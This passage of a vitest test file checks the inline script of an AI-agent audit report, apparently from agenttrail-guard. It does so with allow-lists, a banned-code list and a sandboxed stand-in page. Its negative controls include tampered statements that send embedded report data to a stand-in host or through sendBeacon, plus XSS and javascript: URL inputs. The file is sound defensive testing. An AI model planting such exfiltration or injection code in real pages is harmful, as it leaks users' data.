// cspell:words beforeprint afterprint ttps
/**
 * The report's one script: what it must never contain, and what it does.
 *
 * The static checks read the source: a Content-Security-Policy stops requests but not
 * navigation, so the script is held to allow-lists — the property names it may use, the lines
 * that may mention `href`, the attributes it may set and the element it may create — with a
 * negative control per rule. The behaviour checks run the real script in a bare `node:vm` context,
 * against a small stand-in for the page that implements only what the script touches.
 */

import { runInNewContext } from "node:vm";
import { describe, expect, it } from "vitest";
import { renderReport } from "../core/report.js";
import {
  EXPORT_PREFIX,
  REPORT_SCRIPT,
  REPORT_SCRIPT_LOGIC,
  SHARE_PREFIX,
  THEME_KEY,
} from "../core/report-script.js";

// ── What the script may contain: allow-lists ────────────────────────────────

/** Every property name the script may use. Anything else is a violation. */
const ALLOWED_PROPERTIES = new Set([
  "add",
  "addEventListener",
  "appendChild",
  "body",
  "call",
  "classList",
  "click",
  "clientWidth",
  "clipboard",
  "codePointAt",
  "contains",
  "createElement",
  "documentElement",
  "download",
  "execCommand",
  "focus",
  "forEach",
  "from",
  "getAttribute",
  "getElementById",
  "getItem",
  "getSelection",
  "href",
  "indexOf",
  "key",
  "length",
  "localStorage",
  "matchMedia",
  "matches",
  "open",
  "parse",
  "preventDefault",
  "print",
  "prototype",
  "push",
  "querySelectorAll",
  "removeChild",
  "scrollWidth",
  "select",
  "selectAllChildren",
  "setAttribute",
  "setItem",
  "slice",
  "stringify",
  "tagName",
  "textContent",
  "then",
  "toggle",
  "toLowerCase",
  "trim",
  "value",
  "writeText",
]);

/** The only lines that may mention `href`: two writes, each behind a fixed prefix. */
const ALLOWED_HREF_LINES = [
  "function shareSuffix(href) {",
  'if (typeof href !== "string" || href.indexOf(SHARE_PREFIX) !== 0) return null;',
  'var at = href.indexOf("&url=");',
  "return at === -1 ? null : href.slice(at);",
  "function shareHref(text, suffix) {",
  "function exportHref(raw) {",
  "a.href = exportHref(data.textContent);",
  'var suffix = shareLink ? shareSuffix(shareLink.getAttribute("href")) : null;',
  "shareLink.href = shareHref(shareInput.value, suffix);",
];

/** The only statements that may add or remove an element: the export's temporary link. */
const ALLOWED_TREE_CHANGES = ["document.body.appendChild(a);", "document.body.removeChild(a);"];

/** The only object whose method the script may borrow with `.call`. */
const ALLOWED_CALL = "Array.prototype.forEach";

/** The only statement that may click an element: the export's temporary link. */
const ALLOWED_CLICKS = ["a.click();"];

/** Names that may be assigned in one statement only: the export's link and the post suffix. */
const PINNED_ASSIGNMENTS: readonly (readonly [string, string])[] = [
  ["a", 'var a = document.createElement("a");'],
  ["suffix", 'var suffix = shareLink ? shareSuffix(shareLink.getAttribute("href")) : null;'],
];

/** The attributes the script may set, and the one element it may create. */
const SETTABLE_ATTRIBUTES = new Set([
  '"data-theme"',
  '"aria-pressed"',
  '"aria-expanded"',
  '"data-over"',
  '"role"',
  '"tabindex"',
]);
const CREATABLE_ELEMENTS = new Set(['"a"']);

/** Calls and names that are never allowed, whatever property list they get past. */
const BANNED_CODE: readonly [string, RegExp][] = [
  ["a call to open", /\bopen\s*\(/],
  ["computed member access", /[\w$)\]]\s*\[/],
  ["an appending href write", /\.href\s*[-+*|&]=/],
  ["a timer given a string", /set(Timeout|Interval)\(\s*""/],
  ["dynamic import", /\bimport\s*\(/],
  ["eval", /\beval\b/],
  ["the Function constructor", /\bFunction\b/],
  ["a network constructor", /\b(XMLHttpRequest|WebSocket|EventSource|Worker|Image)\b/],
  ["fetch", /\bfetch\b/],
  ["location", /\blocation\b/],
  ["Reflect", /\bReflect\b/],
];

/** Split the script into code with string literals emptied, and the literals themselves. */
function splitStrings(source: string): { code: string; strings: string[] } {
  const strings: string[] = [];
  const code = source
    .replace(/"(?:[^"\\\n]|\\.)*"|'(?:[^'\\\n]|\\.)*'|`(?:[^`\\]|\\.)*`/g, (literal) => {
      strings.push(literal);
      return '""';
    })
    .replace(/\/\/[^\n]*/g, "")
    .replace(/\/\*[\s\S]*?\*\//g, "");
  return { code, strings };
}

/** Every way `source` steps outside the allow-lists. Empty for the shipped script. */
function scriptViolations(source: string): string[] {
  const out: string[] = [];
  const { code, strings } = splitStrings(source);
  const lines = source.split("\n").map((line) => line.trim());

  for (const m of code.matchAll(/\.\s*([A-Za-z_$][\w$]*)/g)) {
    if (!ALLOWED_PROPERTIES.has(m[1] ?? "")) out.push(`property .${m[1]}`);
  }
  // A borrowed method runs with any receiver, so only the one known borrow is allowed.
  for (const m of code.matchAll(/([\w$.\s]*?)\.\s*call\b/g)) {
    if (
      (m[1] ?? "")
        .replace(/\s+/g, "")
        .split(/[^\w$.]/)
        .pop() !== ALLOWED_CALL
    ) {
      out.push(`borrowed call: ${(m[0] ?? "").trim()}`);
    }
  }
  // These two are checked by their arguments below, so they may only be called directly.
  for (const m of code.matchAll(/\b(setAttribute|createElement)\b(?!\s*\()/g)) {
    out.push(`indirect ${m[1]}`);
  }
  for (const line of code.split("\n").map((l) => l.trim())) {
    // With the string literals emptied, an event name like "click" is gone: only code is left.
    if (/\bclick\b/.test(line) && !ALLOWED_CLICKS.includes(line)) out.push(`click: ${line}`);
  }
  // The clicked element and the post link's fixed suffix are each set in one place only.
  for (const line of lines) {
    for (const [name, only] of PINNED_ASSIGNMENTS) {
      if (new RegExp(`\\b${name}\\s*(=(?!=)|\\+=)`).test(line) && line !== only) {
        out.push(`assignment to ${name}: ${line}`);
      }
    }
  }
  for (const [label, pattern] of BANNED_CODE) {
    if (pattern.test(code)) out.push(label);
  }
  for (const line of lines.filter((l) => /href/i.test(l))) {
    if (!ALLOWED_HREF_LINES.includes(line)) out.push(`href line: ${line}`);
  }
  for (const line of lines.filter((l) =>
    /\b(appendChild|removeChild|insertBefore|replaceChild|replaceChildren|append|prepend|before|after|replaceWith|remove)\s*\(/.test(
      l,
    ),
  )) {
    if (!ALLOWED_TREE_CHANGES.includes(line)) out.push(`tree change: ${line}`);
  }
  for (const m of source.matchAll(/setAttribute\(\s*([^,)]*)/g)) {
    if (!SETTABLE_ATTRIBUTES.has((m[1] ?? "").trim())) out.push(`setAttribute ${m[1]}`);
  }
  for (const m of source.matchAll(/createElement\(\s*([^,)]*)/g)) {
    if (!CREATABLE_ELEMENTS.has((m[1] ?? "").trim())) out.push(`createElement ${m[1]}`);
  }
  for (const literal of strings) {
    const text = literal.slice(1, -1);
    const isUrl = /^(\w+:|\/\/)/.test(text) || text.includes("//");
    if (isUrl && text !== SHARE_PREFIX && text !== EXPORT_PREFIX) out.push(`URL ${literal}`);
  }
  return out;
}

describe("the script stays inside its allow-lists", () => {
  it("the shipped script has no violation", () => {
    expect(scriptViolations(REPORT_SCRIPT)).toEqual([]);
  });

  it("is plain ASCII, so its hash holds whatever encoding a reader's browser picks", () => {
    expect([...REPORT_SCRIPT].filter((ch) => (ch.codePointAt(0) ?? 0) > 0x7f)).toEqual([]);
  });

  it("writes an href in exactly the two allowed statements", () => {
    const writes = REPORT_SCRIPT.split("\n")
      .map((line) => line.trim())
      .filter((line) => /\.href\s*=/.test(line));
    expect(writes).toEqual([
      "a.href = exportHref(data.textContent);",
      "shareLink.href = shareHref(shareInput.value, suffix);",
    ]);
  });

  it("each allowed write starts from a fixed prefix", () => {
    expect(SHARE_PREFIX).toBe("https://x.com/intent/post?text=");
    expect(EXPORT_PREFIX.startsWith("data:application/json")).toBe(true);
    expect(REPORT_SCRIPT_LOGIC).toContain(
      "return SHARE_PREFIX + encodeURIComponent(wellFormed(text)) + suffix;",
    );
    expect(REPORT_SCRIPT_LOGIC).toContain("return EXPORT_PREFIX + encodeURIComponent(");
  });

  // One tampered statement per rule. Each must be reported.
  const TAMPERED: readonly [string, string][] = [
    ["a bare open()", "open(u);"],
    ["self.open()", "self.open(u);"],
    ["window.open()", "window.open(u);"],
    ["a computed href write", 'a["href"] = u;'],
    ["a computed name", "window[key] = u;"],
    ["an appending href write", "a.href += u;"],
    ["setAttribute with a variable name", "el.setAttribute(name, u);"],
    ["setAttribute href", 'el.setAttribute("href", u);'],
    ["setAttributeNS", 'el.setAttributeNS(null, "href", u);'],
    ["Object.assign", "Object.assign(a, { target: u });"],
    ["Reflect.set", 'Reflect.set(a, "target", u);'],
    ["a ping write", "a.ping = u;"],
    ["an action write", "f.action = u;"],
    ["a formAction write", "b.formAction = u;"],
    ["a srcdoc write", "i.srcdoc = u;"],
    ["a src write", "img.src = u;"],
    ["innerHTML", "el.innerHTML = s;"],
    ["outerHTML", "el.outerHTML = s;"],
    ["insertAdjacentHTML", 'el.insertAdjacentHTML("beforeend", s);'],
    ["document.write", "document.write(s);"],
    ["location", "location.assign(u);"],
    ["fetch", "fetch(u);"],
    ["sendBeacon", "navigator.sendBeacon(u, d);"],
    ["a WebSocket", "new WebSocket(u);"],
    ["an image", "new Image();"],
    ["dynamic import", 'import("./x.js");'],
    ["eval", "eval(s);"],
    ["the Function constructor", "new Function(s);"],
    ["a timer given a string", 'setTimeout("x()", 1);'],
    ["a protocol-relative URL", 'var u = "//example.com/x";'],
    ["a full URL", 'var u = "https://example.com/x";'],
    ["a javascript: URL", 'var u = "javascript:alert(1)";'],
    ["an href in an object literal", "var o = { href: u };"],
    ["moving a row", "row.parentNode.appendChild(row);"],
    ["inserting a row", "list.insertBefore(row, null);"],
    ["replacing the rows", "list.replaceChildren(row);"],
    ["appending a row", "list.append(row);"],
    ["creating another element", 'document.createElement("img");'],
    ["a borrowed setAttribute", 'shareLink.setAttribute.call(shareLink, "src", u);'],
    ["a borrowed createElement", 'var el = document.createElement.call(document, "iframe");'],
    ["a click on another element", "shareLink.click();"],
    [
      "a built attribute name through a borrowed call",
      'var k = "hr" + "ef"; shareLink.setAttribute.call(shareLink, k, "h" + "ttps" + ":" + "/" + "/e.example/?" + data.textContent);',
    ],
    ["a stored setAttribute", "var set = el.setAttribute; set(name, u);"],
    ["another borrowed method", "Array.prototype.map.call(rows, f);"],
    [
      "a click inside a listener",
      'x.addEventListener("click", function () { shareLink.click(); });',
    ],
    ["a click on another element named a", "var a = shareLink;\na.click();"],
    [
      "data added to the post suffix",
      'suffix = "&d=" + encodeURIComponent(data.textContent) + suffix;',
    ],
    ["data appended to the post suffix", "suffix += data.textContent;"],
  ];

  it.each(TAMPERED)("negative control — %s is reported", (_label, statement) => {
    expect(scriptViolations(`${REPORT_SCRIPT}\n${statement}\n`)).not.toEqual([]);
  });
});

// ── The script and the page agree ───────────────────────────────────────────

describe("everything the script looks for is in the rendered page", () => {
  const META = { version: "0.0.0", generatedAt: new Date("2026-10-01T09:00:00.000Z") };
  const finding = {
    ruleId: "t.x",
    title: "A guardrail",
    severity: "high",
    action: "block" as const,
    count: 1,
    examples: [{ text: "x", count: 1 }],
    owasp: ["ASI02" as const],
  };
  const html = renderReport(
    {
      agent: "claude",
      sessions: 1,
      quarantined: 0,
      notRead: 0,
      skippedLines: 0,
      projects: 1,
      toolCalls: 1,
      riskyActions: 1,
      riskyByAction: { block: 1, require_approval: 0, warn: 0 },
      decided: [{ action: "block", ruleIds: ["t.x"], calls: 1 }],
      findings: [finding],
      recurring: [],
      owasp: [{ id: "ASI02" as const, callCount: 1, ruleMatches: 1, guardrailCount: 1 }],
      tokens: null,
    },
    META,
  );
  const ids = new Set([...html.matchAll(/\sid="([^"]+)"/g)].map((m) => m[1]));

  it("every id the script asks for", () => {
    const wanted = [...REPORT_SCRIPT.matchAll(/byId\("([^"]+)"\)/g)].map((m) => m[1]);
    expect(wanted.length).toBeGreaterThan(5);
    for (const id of wanted) expect(ids.has(id), id).toBe(true);
  });

  it("every selector the script queries", () => {
    const present: Record<string, RegExp> = {
      "[data-copy]": /\sdata-copy="/,
      details: /<details\b/,
      "#flist .frow": /id="flist"[\s\S]*<details class="frow"/,
      "#flist .fgroup": /id="flist"[\s\S]*<div class="fgroup"/,
      ".cmd": /<code class="cmd">/,
    };
    const wanted = [...REPORT_SCRIPT.matchAll(/each\("([^"]+)"/g)].map((m) => m[1] ?? "");
    expect(wanted.length).toBeGreaterThan(3);
    for (const selector of wanted) {
      const pattern = present[selector];
      expect(pattern, `no check for ${selector}`).toBeDefined();
      expect(html).toMatch(pattern as RegExp);
    }
  });

  it("every copy button names an element that exists", () => {
    const targets = [...html.matchAll(/\sdata-copy="([^"]+)"/g)].map((m) => m[1]);
    expect(targets.length).toBeGreaterThan(2);
    for (const id of targets) expect(ids.has(id), id).toBe(true);
  });

  it("the sorts need no script: each one is a radio, and each row carries its rank", () => {
    const sorts = [...html.matchAll(/<input type="radio" name="fs" id="[^"]+" value="([^"]+)"/g)];
    expect(sorts.map((m) => m[1])).toEqual(["risk", "category", "count", "name"]);
    for (const [, key] of sorts) expect(html).toMatch(new RegExp(`--o-${key}: \\d+`));
    expect(REPORT_SCRIPT).not.toContain('name="fs"');
  });
});

// ── The pure functions ──────────────────────────────────────────────────────

interface Logic {
  xLength(text: string): number;
  postLength(text: string): number;
  shareSuffix(href: unknown): string | null;
  shareHref(text: string, suffix: string): string;
  readTheme(value: unknown): string | null;
  nextTheme(current: unknown, systemDark: boolean): string;
  copiedText(name: unknown): string;
  matchesQuery(text: unknown, query: unknown): boolean;
  searchText(shown: number, total: number): string;
  exportHref(raw: string): string;
}

const logic = runInNewContext(
  `${REPORT_SCRIPT_LOGIC}
({ xLength, postLength, shareSuffix, shareHref, readTheme, nextTheme, copiedText, matchesQuery,
   searchText, exportHref });`,
) as Logic;

const SUFFIX = `&url=${encodeURIComponent("https://www.agenttrail.sh/agenttrail-guard?utm_source=guard")}&hashtags=agenttrail`;
const LINK = `${SHARE_PREFIX}${encodeURIComponent("hello")}${SUFFIX}`;

describe("the share link", () => {
  it("keeps the rendered link's suffix and rejects any other link", () => {
    expect(logic.shareSuffix(LINK)).toBe(SUFFIX);
    expect(logic.shareSuffix("javascript:alert(1)")).toBeNull();
    expect(logic.shareSuffix(`https://example.com/?text=a${SUFFIX}`)).toBeNull();
    expect(logic.shareSuffix(null)).toBeNull();
  });

  it.each([
    "javascript:alert(1)",
    '"><script>alert(1)</script>',
    "line one\nline two",
    "&url=https://example.com&hashtags=x",
    "日本語 and café 🙂",
  ])("stays an X post whatever is typed: %s", (typed) => {
    const href = logic.shareHref(typed, SUFFIX);
    expect(href.startsWith(SHARE_PREFIX)).toBe(true);
    const url = new URL(href);
    expect(url.origin).toBe("https://x.com");
    expect(url.searchParams.get("text")).toBe(typed);
    expect(url.searchParams.getAll("url")).toEqual([
      "https://www.agenttrail.sh/agenttrail-guard?utm_source=guard",
    ]);
    expect(url.searchParams.getAll("hashtags")).toEqual(["agenttrail"]);
  });

  it.each([
    ["edited text \uD800", "edited text �"],
    ["\uDC00 at the start", "� at the start"],
    ["pair 🙂 then \uDBFF", "pair 🙂 then �"],
    ["pair 🙂", "pair 🙂"],
  ])("writes a lone surrogate as the replacement character instead of failing: %j", (typed, sent) => {
    const href = logic.shareHref(typed, SUFFIX);
    expect(new URL(href).searchParams.get("text")).toBe(sent);
    expect(href.endsWith(SUFFIX)).toBe(true);
  });

  it("weighs text as X does", () => {
    const base = logic.postLength("");
    expect(base).toBe(1 + 23 + 1 + "#agenttrail".length);
    expect(logic.xLength("abc")).toBe(3);
    expect(logic.xLength("日本")).toBe(4);
    expect(logic.xLength("🙂")).toBe(2);
  });
});

describe("theme and search", () => {
  it("reads back only light or dark", () => {
    expect(logic.readTheme("light")).toBe("light");
    expect(logic.readTheme("dark")).toBe("dark");
    for (const junk of ["", "Dark", "blue", "<script>", null, undefined, 1]) {
      expect(logic.readTheme(junk)).toBeNull();
    }
  });

  it("toggles away from what is shown, starting from the system's choice", () => {
    expect(logic.nextTheme(null, true)).toBe("light");
    expect(logic.nextTheme(null, false)).toBe("dark");
    expect(logic.nextTheme("light", true)).toBe("dark");
    expect(logic.nextTheme("junk", false)).toBe("dark");
  });

  it("matches a search anywhere in a row's text, ignoring case and outer spaces", () => {
    expect(logic.matchesQuery("Branch overwrite  branch-overwrite main", "OVERWRITE")).toBe(true);
    expect(logic.matchesQuery("Branch overwrite", "  branch ")).toBe(true);
    expect(logic.matchesQuery("Branch overwrite", "tidy")).toBe(false);
    // An empty search matches every row.
    for (const empty of ["", "   ", null, undefined])
      expect(logic.matchesQuery("x", empty)).toBe(true);
    expect(logic.matchesQuery(null, "x")).toBe(false);
  });

  it("says how many rows a search left, out of all of them", () => {
    expect(logic.searchText(2, 7)).toBe("Showing 2 of 7 guardrails that match the search");
    expect(logic.searchText(0, 1)).toBe("Showing 0 of 1 guardrail that match the search");
  });
});

describe("the export", () => {
  it("is a data URL holding exactly the embedded data, pretty-printed", () => {
    const payload = { tool: "agenttrail-guard", findings: [{ text: "a </script> b" }] };
    const raw = JSON.stringify(payload).replace(/</g, "\\u003c");
    const href = logic.exportHref(raw);
    expect(href.startsWith(EXPORT_PREFIX)).toBe(true);
    const json = decodeURIComponent(href.slice(EXPORT_PREFIX.length));
    expect(JSON.parse(json)).toEqual(payload);
    expect(json.endsWith("\n")).toBe(true);
  });
});

// ── The script in a page ────────────────────────────────────────────────────

interface KeyEvent {
  readonly key: string;
  preventDefault(): void;
}
type Listener = (event?: KeyEvent) => void;

/** An element's class list, as much of it as the script uses. */
class FakeClassList {
  constructor(private readonly owner: FakeElement) {}
  private get list(): string[] {
    return (this.owner.getAttribute("class") ?? "").split(" ").filter((c) => c !== "");
  }
  contains(name: string): boolean {
    return this.list.includes(name);
  }
  add(name: string): void {
    if (!this.contains(name)) this.owner.setAttribute("class", [...this.list, name].join(" "));
  }
  toggle(name: string, force?: boolean): boolean {
    const on = force ?? !this.contains(name);
    const rest = this.list.filter((c) => c !== name);
    this.owner.setAttribute("class", (on ? [...rest, name] : rest).join(" "));
    return on;
  }
}

/** The parts of an element the script touches, and nothing more. */
class FakeElement {
  readonly attrs = new Map<string, string>();
  readonly listeners = new Map<string, Listener[]>();
  readonly classList: FakeClassList = new FakeClassList(this);
  open = false;
  textContent = "";
  value = "";
  download = "";
  selected = false;
  scrollWidth = 100;
  clientWidth = 100;
  /** Upper case, as a real page reports an HTML element's tag name. */
  readonly tagName: string;
  constructor(tag: string, attrs: Record<string, string> = {}) {
    this.tagName = tag.toUpperCase();
    for (const [k, v] of Object.entries(attrs)) this.attrs.set(k, v);
  }
  getAttribute(name: string): string | null {
    return this.attrs.get(name) ?? null;
  }
  setAttribute(name: string, value: string): void {
    this.attrs.set(name, String(value));
  }
  get href(): string {
    return this.attrs.get("href") ?? "";
  }
  set href(value: string) {
    this.attrs.set("href", value);
  }
  addEventListener(type: string, fn: Listener): void {
    this.listeners.set(type, [...(this.listeners.get(type) ?? []), fn]);
  }
  fire(type: string, event?: KeyEvent): void {
    for (const fn of this.listeners.get(type) ?? []) fn(event);
  }
  click(): void {
    this.fire("click");
  }
  select(): void {
    this.selected = true;
  }
  focused = false;
  focus(): void {
    this.focused = true;
  }
}

interface Page {
  readonly elements: FakeElement[];
  readonly byId: Map<string, FakeElement>;
  readonly root: FakeElement;
  readonly windowListeners: Map<string, Listener[]>;
  readonly stored: Map<string, string>;
  readonly appended: FakeElement[];
  printed: number;
  copied: string[];
  execCommands: string[];
  /** Elements whose text the script selected in place. */
  selectedAll: FakeElement[];
  timers: (() => void)[];
}

interface PageOptions {
  readonly storage?: "works" | "throws";
  readonly stored?: string;
  readonly systemDark?: boolean;
  /** How the clipboard behaves: it works, it is not there, or it refuses. */
  readonly clipboard?: "works" | "missing" | "rejects";
  /** What `execCommand("copy")` does: copies, reports it did not, or throws. */
  readonly execCopy?: "copies" | "refuses" | "throws";
}

/** A page shaped like the report, with three findings in two groups, and the script run on it. */
function loadPage(options: PageOptions = {}): Page {
  const el = (tag: string, attrs: Record<string, string> = {}, text = ""): FakeElement => {
    const e = new FakeElement(tag, attrs);
    e.textContent = text;
    return e;
  };
  const elements: FakeElement[] = [
    el("button", { id: "theme", class: "icon-btn js-only", "aria-pressed": "false" }),
    el("button", { id: "print", class: "icon-btn js-only" }),
    el("button", { id: "export", class: "icon-btn js-only" }),
    el("section", { id: "findings" }),
    el("input", { id: "search", class: "search js-only" }),
    el("span", { id: "rc-search", class: "rc-js" }),
    el("div", { class: "fgroup", "data-cat": "git" }, "Git"),
    el("details", { class: "frow", "data-cat": "git" }, "Branch overwrite branch-overwrite main"),
    el("details", { class: "frow", "data-cat": "git" }, "Tree reset tree-reset <ref>"),
    el("div", { class: "fgroup", "data-cat": "files" }, "Files"),
    el("details", { class: "frow", "data-cat": "files" }, "Folder delete folder-delete <path>"),
    el("div", { id: "flist-empty", class: "flist-empty" }),
    el("button", { id: "expand-all", "aria-expanded": "false" }, "Expand all"),
    el("details", { class: "more-info" }),
    el("code", { class: "cmd" }, "a short command"),
    el("code", { class: "cmd" }, "a command too long for its box"),
    el("code", { id: "cmd-init" }, "agenttrail-guard init --agent claude"),
    el(
      "button",
      {
        class: "js-only",
        "data-copy": "cmd-init",
        "data-label": "Copy",
        "aria-label": "Copy the init command",
      },
      "Copy",
    ),
    el("textarea", { id: "share-text" }),
    el(
      "button",
      { class: "btn js-only", "data-copy": "share-text", "data-label": "Copy text" },
      "Copy text",
    ),
    el("a", { id: "share-link", href: LINK }),
    el("span", { id: "share-count" }),
    el("p", { id: "page-status" }),
    el("div", { id: "toast", class: "toast" }),
    el("textarea", { id: "copy-buffer" }),
    el("script", { id: "report-data" }, JSON.stringify({ tool: "agenttrail-guard", n: 1 })),
  ];
  const byId = new Map<string, FakeElement>();
  for (const e of elements) {
    const id = e.getAttribute("id");
    if (id !== null) byId.set(id, e);
  }
  const long = elements.filter((e) => e.classList.contains("cmd"))[1];
  if (long) long.scrollWidth = 300;
  const more = elements.find((e) => e.classList.contains("more-info"));
  if (more) more.open = true;

  const root = new FakeElement("html");
  const windowListeners = new Map<string, Listener[]>();
  const stored = new Map<string, string>();
  if (options.stored !== undefined) stored.set(THEME_KEY, options.stored);
  const appended: FakeElement[] = [];
  const page: Page = {
    elements,
    byId,
    root,
    windowListeners,
    stored,
    appended,
    printed: 0,
    copied: [],
    execCommands: [],
    selectedAll: [],
    timers: [],
  };

  const matches = (e: FakeElement, selector: string): boolean => {
    if (selector === "[data-copy]") return e.getAttribute("data-copy") !== null;
    if (selector === "details") return e.tagName === "DETAILS";
    if (selector === "#flist .frow") return e.classList.contains("frow");
    if (selector === "#flist .fgroup") return e.classList.contains("fgroup");
    if (selector === ".cmd") return e.classList.contains("cmd");
    throw new Error(`the script asked for a selector this page does not model: ${selector}`);
  };

  const localStorage = {
    getItem: (k: string) => stored.get(k) ?? null,
    setItem: (k: string, v: string) => void stored.set(k, v),
  };
  const window = {
    get localStorage() {
      if (options.storage === "throws") throw new Error("storage is blocked");
      return localStorage;
    },
    matchMedia: () => ({ matches: options.systemDark ?? false }),
    print: () => {
      page.printed++;
    },
    addEventListener: (type: string, fn: Listener) => {
      windowListeners.set(type, [...(windowListeners.get(type) ?? []), fn]);
    },
    getSelection: () => ({
      selectAllChildren: (e: FakeElement) => void page.selectedAll.push(e),
    }),
  };
  const document = {
    documentElement: root,
    body: {
      appendChild: (e: FakeElement) => void appended.push(e),
      removeChild: () => undefined,
    },
    getElementById: (id: string) => byId.get(id) ?? null,
    querySelectorAll: (selector: string) => elements.filter((e) => matches(e, selector)),
    createElement: (tag: string) => new FakeElement(tag),
    execCommand: (command: string) => {
      page.execCommands.push(command);
      if (options.execCopy === "throws") throw new Error("not allowed");
      return options.execCopy !== "refuses";
    },
  };
  const clipboard = {
    writeText: (text: string) => {
      if (options.clipboard === "rejects") return Promise.reject(new Error("not allowed"));
      page.copied.push(text);
      return Promise.resolve();
    },
  };
  const navigator = options.clipboard === "missing" ? {} : { clipboard };
  const setTimeout = (fn: () => void) => {
    page.timers.push(fn);
    return 0;
  };
  const clearTimeout = () => undefined;
  runInNewContext(REPORT_SCRIPT, { window, document, navigator, setTimeout, clearTimeout });
  return page;
}

const has = (e: FakeElement | undefined, name: string): boolean =>
  e?.classList.contains(name) ?? false;
const rows = (page: Page) => page.elements.filter((e) => has(e, "frow"));
const groups = (page: Page) => page.elements.filter((e) => has(e, "fgroup"));

/** Types `text` into the search box. */
function type(page: Page, text: string): void {
  const search = page.byId.get("search") as FakeElement;
  search.value = text;
  search.fire("input");
}

describe("the script in the page", () => {
  it("marks the page as scripted, which shows the controls that need it", () => {
    expect(has(loadPage().root, "js")).toBe(true);
  });

  it("hides the rows a search does not match, and each group left empty", () => {
    const page = loadPage();
    type(page, "OVERWRITE");
    expect(rows(page).map((r) => has(r, "nomatch"))).toEqual([false, true, true]);
    expect(groups(page).map((g) => has(g, "nomatch"))).toEqual([false, true]);
    expect(has(page.byId.get("findings"), "searching")).toBe(true);
    expect(page.byId.get("rc-search")?.textContent).toBe(
      "Showing 1 of 3 guardrails that match the search",
    );
    expect(has(page.byId.get("flist-empty"), "show")).toBe(false);
  });

  it("searches command text too, and puts everything back when cleared", () => {
    const page = loadPage();
    type(page, "folder-delete");
    expect(rows(page).map((r) => has(r, "nomatch"))).toEqual([true, true, false]);
    type(page, "  ");
    expect(rows(page).map((r) => has(r, "nomatch"))).toEqual([false, false, false]);
    expect(groups(page).map((g) => has(g, "nomatch"))).toEqual([false, false]);
    expect(has(page.byId.get("findings"), "searching")).toBe(false);
    expect(page.byId.get("rc-search")?.textContent).toBe("");
  });

  it("says so when a search leaves nothing", () => {
    const page = loadPage();
    type(page, "nothing like this");
    expect(rows(page).every((r) => has(r, "nomatch"))).toBe(true);
    expect(has(page.byId.get("flist-empty"), "show")).toBe(true);
  });

  it("opens every row with Expand all, and closes them again", () => {
    const page = loadPage();
    const button = page.byId.get("expand-all") as FakeElement;
    button.click();
    expect(rows(page).map((r) => r.open)).toEqual([true, true, true]);
    expect(button.getAttribute("aria-expanded")).toBe("true");
    expect(button.textContent).toBe("Collapse all");
    button.click();
    expect(rows(page).map((r) => r.open)).toEqual([false, false, false]);
    expect(button.textContent).toBe("Expand all");
  });

  it("makes only a cut-off command a button that opens it in full", () => {
    const page = loadPage();
    const [short, long] = page.elements.filter((e) => has(e, "cmd"));
    expect(short?.getAttribute("role")).toBeNull();
    expect(long?.getAttribute("role")).toBe("button");
    expect(long?.getAttribute("tabindex")).toBe("0");
    long?.click();
    expect(has(long, "expanded")).toBe(true);
    expect(long?.getAttribute("aria-expanded")).toBe("true");
    let prevented = false;
    long?.fire("keydown", {
      key: "Enter",
      preventDefault: () => {
        prevented = true;
      },
    });
    expect(has(long, "expanded")).toBe(false);
    expect(prevented).toBe(true);
    long?.fire("keydown", { key: "a", preventDefault: () => undefined });
    expect(has(long, "expanded")).toBe(false);
  });

  it("remembers a theme choice, and applies it on the next load", () => {
    const page = loadPage({ systemDark: true });
    const toggle = page.byId.get("theme") as FakeElement;
    // Pressed means dark is showing.
    expect(toggle.getAttribute("aria-pressed")).toBe("true");
    toggle.click();
    expect(page.root.getAttribute("data-theme")).toBe("light");
    expect(page.stored.get(THEME_KEY)).toBe("light");
    expect(toggle.getAttribute("aria-pressed")).toBe("false");
    const again = loadPage({ stored: "light" });
    expect(again.root.getAttribute("data-theme")).toBe("light");
  });

  it("ignores a stored theme that is not light or dark", () => {
    const page = loadPage({ stored: '"><script>' });
    expect(page.root.getAttribute("data-theme")).toBeNull();
  });

  it("still works when storage is blocked", () => {
    const page = loadPage({ storage: "throws" });
    (page.byId.get("theme") as FakeElement).click();
    expect(page.root.getAttribute("data-theme")).toBe("dark");
    type(page, "tree-reset");
    expect(rows(page).map((r) => has(r, "nomatch"))).toEqual([true, false, true]);
  });

  /** The copy button that names `target`. */
  const copyButton = (page: Page, target: string) =>
    page.elements.find((e) => e.getAttribute("data-copy") === target) as FakeElement;

  /** Let a settled clipboard promise run its handlers. */
  const settle = async () => {
    for (let i = 0; i < 3; i++) await Promise.resolve();
  };

  it("copies the text of the element a button names", async () => {
    const page = loadPage();
    copyButton(page, "cmd-init").click();
    await settle();
    expect(page.copied).toEqual(["agenttrail-guard init --agent claude"]);
  });

  it("copies a text area's value, not its text", async () => {
    const page = loadPage();
    const input = page.byId.get("share-text") as FakeElement;
    input.textContent = "the text the page was rendered with";
    input.value = "the text as edited";
    copyButton(page, "share-text").click();
    await settle();
    expect(page.copied).toEqual(["the text as edited"]);
  });

  it("says Copied, in the button and a toast, then puts its own label back", async () => {
    const page = loadPage();
    const button = copyButton(page, "share-text");
    button.click();
    await settle();
    expect(button.textContent).toBe("Copied");
    expect(has(button, "copied")).toBe(true);
    expect(has(page.byId.get("toast"), "show")).toBe(true);
    for (const fn of page.timers) fn();
    expect(button.textContent).toBe("Copy text");
    expect(has(button, "copied")).toBe(false);
    expect(has(page.byId.get("toast"), "show")).toBe(false);
  });

  it.each([
    "missing",
    "rejects",
  ] as const)("copies by hand through the hidden buffer when the clipboard %s", async (mode) => {
    const page = loadPage({ clipboard: mode });
    const button = copyButton(page, "cmd-init");
    button.click();
    await settle();
    const buffer = page.byId.get("copy-buffer") as FakeElement;
    expect(page.copied).toEqual([]);
    expect(buffer.value).toBe("agenttrail-guard init --agent claude");
    expect(buffer.selected).toBe(true);
    expect(page.execCommands).toEqual(["copy"]);
    expect(button.textContent).toBe("Copied");
    // Focus comes back from the hidden buffer to the button.
    expect(button.focused).toBe(true);
    for (const fn of page.timers) fn();
    expect(page.byId.get("page-status")?.textContent).toBe("Copied the init command");
  });

  it.each([
    "refuses",
    "throws",
  ] as const)("says how to copy by hand, with the text selected where it is shown, when copying %s", async (execCopy) => {
    const page = loadPage({ clipboard: "missing", execCopy });
    const button = copyButton(page, "cmd-init");
    button.click();
    await settle();
    expect(button.textContent).toBe("Press Ctrl+C or ⌘C");
    expect(button.focused).toBe(true);
    expect(page.selectedAll).toEqual([page.byId.get("cmd-init")]);
    for (const fn of page.timers) fn();
    expect(page.byId.get("page-status")?.textContent).toContain("press Ctrl+C");
    expect(button.textContent).toBe("Copy");
  });

